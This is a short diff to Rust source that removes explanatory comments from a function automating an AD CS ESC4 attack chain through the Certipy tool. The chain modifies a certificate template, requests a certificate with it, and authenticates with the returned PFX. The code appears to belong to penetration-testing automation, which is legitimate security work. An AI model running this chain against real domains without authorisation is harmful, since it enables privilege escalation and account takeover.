@@ -133,16 +133,10 @@ pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
 ///                `ca`, `pfx_path`
 /// Optional args: `upn`
 pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
-    // Step 1: Modify the template.
     let template_output = certipy_template_esc4(args).await?;
-
-    // Step 2: Request a certificate using the modified template.
     let request_output = certipy_request(args).await?;
-
-    // Step 3: Authenticate with the obtained PFX.
     let auth_output = certipy_auth(args).await?;
 
-    // Combine all outputs into a single result.
     let combined_stdout = format!(
         "=== Step 1: Template Modification ===\n{}\n\
          === Step 2: Certificate Request ===\n{}\n\
